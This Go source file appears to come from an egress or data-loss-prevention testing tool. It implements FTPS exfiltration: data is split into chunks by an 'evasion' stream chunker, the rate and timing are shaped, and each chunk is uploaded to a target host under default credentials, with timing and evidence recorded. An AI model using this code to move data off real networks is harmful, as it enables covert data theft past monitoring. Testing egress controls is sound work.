package file

import (
	"bytes"
	"context"
	"crypto/sha256"
	"crypto/tls"
	"encoding/hex"
	"fmt"
	"io"
	"net"
	"strconv"
	"strings"
	"time"

	jftp "github.com/jlaffaye/ftp"
	"github.com/shehzade/contraband/pkg/client/evasion"
	"github.com/shehzade/contraband/pkg/client/exfil"
	"github.com/shehzade/contraband/pkg/common"
)

// FTPSExfiltrator implements Explicit and Implicit FTPS exfiltration.
type FTPSExfiltrator struct{}

func NewFTPSExfiltrator() *FTPSExfiltrator {
	return &FTPSExfiltrator{}
}

func init() {
	exfil.RegisterExfiltrator(common.ProtoFTPS, NewFTPSExfiltrator())
}

func (e *FTPSExfiltrator) Protocol() string {
	return common.ProtoFTPS
}

func (e *FTPSExfiltrator) Exfiltrate(ctx context.Context, reader io.Reader, opts exfil.ExfilOptions) (*common.ProbeResult, error) {
	if err := opts.Validate(); err != nil {
		return nil, err
	}

	start := time.Now().UTC()
	result, err := common.NewProbeResult("exfil", e.Protocol(), opts.TargetHost, opts.TargetPort)
	if err != nil {
		return nil, err
	}
	result.Timestamps.StartTCP = start
	result.TLSProfile = opts.TLSFingerprint
	result.PayloadType = opts.PayloadType
	result.CarrierType = opts.CarrierType

	if opts.TotalBytes <= 0 {
		if br, ok := reader.(*bytes.Reader); ok {
			opts.TotalBytes = int64(br.Len())
		} else if bb, ok := reader.(*bytes.Buffer); ok {
			opts.TotalBytes = int64(bb.Len())
		}
	}

	if opts.ExpectedHash == "" {
		if br, ok := reader.(*bytes.Reader); ok {
			cur, _ := br.Seek(0, io.SeekCurrent)
			h := sha256.New()
			_, _ = io.Copy(h, br)
			opts.ExpectedHash = hex.EncodeToString(h.Sum(nil))
			_, _ = br.Seek(cur, io.SeekStart)
		}
	}
	result.PayloadHash = opts.ExpectedHash

	if opts.SessionToken.IsZero() {
		tok, tokErr := common.NewSessionToken()
		if tokErr != nil {
			return nil, tokErr
		}
		opts.SessionToken = tok
	}

	chunker, err := evasion.NewStreamChunker(reader, opts.SessionToken, opts.ChunkSize, opts.TotalBytes)
	if err != nil {
		return nil, fmt.Errorf("failed to initialize chunk streamer: %w", err)
	}
	defer chunker.Close()
	result.TargetVolume = opts.TotalBytes

	username := opts.Headers["username"]
	if username == "" {
		username = "contraband"
	}
	password := opts.Headers["password"]
	if password == "" {
		password = "contraband"
	}

	targetAddr := net.JoinHostPort(opts.TargetHost, strconv.Itoa(opts.TargetPort))
	tlsCfg := &tls.Config{
		ServerName:         opts.TargetHost,
		InsecureSkipVerify: opts.InsecureTLS,
	}

	isImplicit := opts.TargetPort == 990 || strings.EqualFold(opts.Headers["ftps_mode"], "implicit")

	var client *jftp.ServerConn
	var dialErr error

	if isImplicit {
		client, dialErr = jftp.Dial(targetAddr, jftp.DialWithTimeout(opts.Timeout), jftp.DialWithTLS(tlsCfg))
	} else {
		client, dialErr = jftp.Dial(targetAddr, jftp.DialWithTimeout(opts.Timeout), jftp.DialWithExplicitTLS(tlsCfg))
	}

	if dialErr != nil {
		result.Verdict = classifyError(dialErr)
		result.ErrorMessage = dialErr.Error()
		calculateDurations(&result)
		return &result, dialErr
	}
	defer func() {
		_ = client.Quit()
	}()

	result.Timestamps.ConnectedTCP = time.Now().UTC()
	result.Timestamps.HandshakeTLS = time.Now().UTC()

	if loginErr := client.Login(username, password); loginErr != nil {
		result.Verdict = classifyError(loginErr)
		result.ErrorMessage = fmt.Sprintf("FTPS login failed: %v", loginErr)
		calculateDurations(&result)
		return &result, loginErr
	}

	result.Timestamps.FirstByteSent = time.Now().UTC()

	var headEvidence []byte
	for {
		chunkFrame, seq, err := chunker.Next()
		if err == io.EOF {
			break
		}
		if err != nil {
			result.Verdict = classifyError(err)
			result.ErrorMessage = err.Error()
			calculateDurations(&result)
			return &result, err
		}

		if len(headEvidence) < 768 && len(chunkFrame) > common.ChunkHeaderSize {
			p := chunkFrame[common.ChunkHeaderSize:]
			needed := 768 - len(headEvidence)
			if needed > len(p) {
				needed = len(p)
			}
			headEvidence = append(headEvidence, p[:needed]...)
		}

		filename := fmt.Sprintf("chunk_%s_%d.dat", opts.SessionToken.String(), seq)

		storErr := client.Stor(filename, bytes.NewReader(chunkFrame))
		if storErr != nil {
			result.Verdict = classifyError(storErr)
			result.ErrorMessage = fmt.Sprintf("FTPS STOR failed for chunk %d: %v", seq, storErr)
			calculateDurations(&result)
			return &result, storErr
		}

		result.BytesSent += int64(len(chunkFrame))

		if opts.Shaper != nil {
			if err := opts.Shaper.WaitN(ctx, len(chunkFrame)); err != nil {
				result.Verdict = classifyError(err)
				result.ErrorMessage = err.Error()
				calculateDurations(&result)
				return &result, err
			}
		}
		if opts.Cadence != nil {
			delay := opts.Cadence.NextDelay()
			if delay > 0 {
				select {
				case <-time.After(delay):
				case <-ctx.Done():
					result.Verdict = classifyError(ctx.Err())
					result.ErrorMessage = ctx.Err().Error()
					calculateDurations(&result)
					return &result, ctx.Err()
				}
			}
		}
	}

	result.Timestamps.AckReceived = time.Now().UTC()
	result.Timestamps.TeardownDone = time.Now().UTC()
	result.Verdict = common.VerdictSuccess
	result.RawEvidence = common.FormatBoundedRawEvidence(headEvidence)
	if result.PayloadHash == "" {
		result.PayloadHash = chunker.PayloadHashHex()
	}

	calculateDurations(&result)
	return &result, nil
}
